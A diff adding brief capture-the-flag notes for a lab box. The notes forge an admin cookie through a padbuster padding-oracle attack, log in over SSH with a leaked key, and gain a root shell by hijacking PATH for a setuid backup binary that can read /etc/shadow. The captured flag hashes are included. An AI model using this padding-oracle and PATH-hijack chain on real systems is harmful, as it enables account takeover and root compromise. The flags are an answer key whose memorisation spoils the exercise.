@@ -1,0 +1,39 @@
+nmap -sC -sV -oN nmap 10.10.10.18 -v -A
+
+port 80 is open -> website
+
+
+once we create an accounti admi:admin -> auth cookie
+(admin is taken already)
+lets decode it with padbuster
+
+-> padbuster http://10.10.10.18 Ni4wVlpHQsjTDhiVPrye1biOBR5EXKhZ 8
+        -cookies auth=Ni4wVlpHQsjTDhiVPrye1biOBR5EXKhZ
+we get: [+] Decrypted value (ASCII): user=admi
+
+-> padbuster http://10.10.10.18 Ni4wVlpHQsjTDhiVPrye1biOBR5EXKhZ 8
+        -cookies auth=Ni4wVlpHQsjTDhiVPrye1biOBR5EXKhZ
+        -plaintext user=admin
+we get: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
+
+change cookie and we are admin -> sshkey of mitsos
+can log with it via ssh
+
+ssh mitsos@10.10.10.18 -i ssh_key
+
+user flag:
+d558e7924bdfe31266ec96b007dc63fc
+
+then ./backup -> prints /etc/shadow as root
+-> ltrace ./backup -> uses 'cat' and not '/bin/cat' in system
+
+lets create cat file which will print /root/root.txt
+
+#!/bin/sh
+/bin/sh
+
+chmod +x cat
+export PATH=/home/mitsos:${PATH}
+
+execute ./backup -> root shell
+990b142c3cefd46a5e7d61f678d45515
